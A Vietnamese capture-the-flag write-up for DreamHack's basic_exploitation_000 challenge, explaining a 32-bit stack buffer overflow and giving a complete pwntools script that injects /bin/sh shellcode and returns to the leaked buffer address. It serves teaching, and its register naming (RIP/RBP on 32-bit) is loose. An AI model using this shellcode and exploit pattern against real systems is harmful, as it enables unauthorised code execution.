# basic_exploitation_000---Write-up-----DreamHack
Hướng dẫn cách giải bài basic_exploitation_000 cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 6/12/2025

## 1. Mục tiêu cần làm
Bài này không có cơ chế bảo mật nên hết và cũng không có hàm win nên chúng ta chỉ có thể xài kĩ thuật **ret2shell** thôi.

## 2. Cách thực thi
Đầu tiên hãy đọc code

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    ;
    printf("buf = (%p)\n", buf)
    scanf("%141s", buf);

    return 0;
}

```

Như các bạn thấy thì nó sẽ lấy tận 141 byte trong khi buf có 128 byte, vậy đây là lỗi **Buffer Overflow** điển hình, nhưng mà nếu nhập buf + saved RBP thì saved RIP chỉ còn có 9 byte thôi không đủ để viết shellcode. Nhưng không sao, giờ hãy nhìn lại vào code.

`printf("buf = (%p)\n", buf)`, dựa vào mã code này thì chúng ta sẽ có được địa chỉ của buf sau khi chạy chương trình. Nhờ thế chúng ta có thể đè saved RIP bằng địa chỉ buf để nó quay lại buf và thực thi shellcode chúng ta đặt trong đó.

Kiểm tra bài là 32 hay 64 bit. Kiểm tra bài là 32 hay 64 bit. Kiểm tra bài là 32 hay 64 bit. Cái gì quan trọng nhắc 3 lần.

Giờ bắt đầu băm bài này thôi. Đầu tiên chúng ta sẽ viết 1 đoạn shellcode thực thi. Mã này viết để chuyên vượt mặt thằng scanf, mã này bạn có thể lụm trên google nha nó có đầy trên đó.

```Python
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
```

Sau khi có shellcode thì chỉ việc bỏ nó vào đầu payload sau đó chèn 1 đống byte rác để đè tới saved RIP rồi thay saved RIP bằng địa chỉ buf là xong. Khá dễ đúng không, hãy cho mình 1 star để có động lực viết write up tiếp nha 🐧.

```Python
from pwn import *

# p = process('./basic_exploitation_000')
p = remote('host3.dreamhack.games', 10032)

p.recvuntil(b'buf = (')
leak = p.recvuntil(b')', drop = True )
buf_add = int(leak, 16)

log.info(f'Leak buf address : {hex(buf_add)}')

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

ret_add = p32(buf_add)

padding_len = 132 - len(shellcode) # tìm offset còn lại sau khi đã nhập shellcode
padding = padding_len * b'A' # chèn byte rác để đè tới saved RIP

payload = shellcode + padding + ret_add

p.sendline(payload)

p.interactive()
```

Vì là 32bit nên tất cả địa chỉ chỉ có 4 byte và saved RIP, saved RBP cũng là 4 byte luôn.
